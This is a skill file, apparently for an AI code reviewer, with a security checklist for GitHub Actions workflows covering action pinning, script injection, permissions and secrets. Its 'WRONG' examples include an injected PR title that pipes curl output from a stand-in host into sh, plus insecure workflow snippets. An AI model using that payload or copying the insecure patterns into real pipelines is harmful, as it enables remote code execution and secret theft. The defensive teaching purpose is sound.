---
name: code-review-github-actions
description: GitHub Actions code-review expertise. Use when reviewing .github/workflows/*.yml, .yaml, action.yml, or action.yaml files — action pinning, script injection, and least-privilege permissions.
---

# GitHub Actions review checklist

GitHub-hosted runners are a privileged execution environment. The
checklist below targets the GitHub-Actions-specific failure modes —
tag-pinning RCE, `${{ ... }}` injection, and over-broad `permissions:`
blocks that escalate a low-trust job into a write-all token.

## Action pinning

- **Third-party actions are pinned to a full commit SHA, not a tag**
  — tags are mutable; an attacker who compromises the action repo
  re-tags and your workflow runs the new code. WRONG:
  `uses: actions/checkout@v4` (tag, mutable). RIGHT:
  `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`
  with the SHA comment for human readers. The `# vX.Y.Z` is a comment
  for you, not for GitHub — SHA is what runs.
- **Self-hosted action refs are SHA-pinned** — same rule.
- **Composite actions ship a pinned `actions:` list in `action.yml`**
  — every entry under the `steps.uses` key.

## `pull_request_target` is RCE-prone

- **`pull_request_target` + `actions/checkout` of the PR head** —
  arbitrary code execution on the runner with write access to repo
  secrets. WRONG:
  ```yaml
  on: pull_request_target
  jobs:
    build:
      steps:
        - uses: actions/checkout@v4
          with: { ref: ${{ github.event.pull_request.head.sha }} } # checks out attacker code with secrets
        - run: npm ci && npm run build
  ```
  RIGHT: split the workflow — a `pull_request` job runs untrusted
  code with no secrets; a `pull_request_target` job runs only with
  maintainer-controlled code, then posts back via a workflow_run or
  `gh api`. Or use the safe pattern of checking out the PR head only
  after explicit maintainer approval.

## Script injection

- **No `${{ github.event.* }}` directly interpolated into `run:`**
  — the entire event payload is attacker-controlled on PRs from
  forks. WRONG: `run: echo "${{ github.event.pull_request.title }}"`
  (a title of `"; curl evil.sh | sh; #` runs). RIGHT: pass via
  `env:` and reference as `"$PR_TITLE"`, or use an intermediate
  variable that is then quoted in the shell step.
- **`pull_request_target` titles, branches, labels, comments are all
  untrusted** — apply the same `env:` indirection to every
  `github.event.*` reference.

## `permissions:` is least-privilege per-job

- **Top-level `permissions: {}`** — declare nothing at the workflow
  level and grant each job exactly what it needs (`read-contents`,
  `write-packages`, etc.). WRONG:
  ```yaml
  permissions: write-all # every job inherits write access
  ```
  RIGHT:
  ```yaml
  permissions: {}
  jobs:
    build:
      permissions: { contents: read }
    deploy:
      permissions: { contents: read, id-token: write } # only deploy needs OIDC
  ```
- **GITHUB_TOKEN scope is intentional** — `packages: write`,
  `id-token: write`, `pages: write` are each granted only where
  required; `actions: read` is the default.

## Secrets & logs

- **No `secrets.*` echoed to logs** — even via `${{ }}` interpolation
  inside `run:`; GitHub masks them in the runner, but a `set -x`
  step or `echo $TOKEN` in a multiline expression can leak through.
  Prefer `env:` and reference the env var.
- **Secret rotation strategy** — long-lived PATs in repo secrets are
  a footgun; prefer OIDC (`id-token: write` + cloud provider trust)
  for cloud deploys.

## `concurrency:` on deploy jobs

- **Deploy jobs declare `concurrency:` to cancel superseded runs**
  — WRONG: two pushes in a minute run two deploys against the same
  environment; the second wins but the first's side-effects remain.
  RIGHT:
  ```yaml
  concurrency:
    group: deploy-${{ github.ref }}
    cancel-in-progress: false # false for deploys, true for builds
  ```

## Cache & artifact trust

- **Caches keyed on untrusted input** — a `cache` key derived from
  `github.event.pull_request.*` lets a fork write to your cache
  namespace; use a prefix that's distinct for forks vs base ref.
- **Artifact downloads cross trust boundaries** — `actions/download-artifact`
  from a job that ran on a fork's code is untrusted; verify checksums
  or sign artifacts.

## See also

For Actions that make outbound HTTP calls, talk to cloud credentials,
or process untrusted input, also apply
[`owasp-top-10-2025`](./../owasp-top-10-2025/SKILL.md).
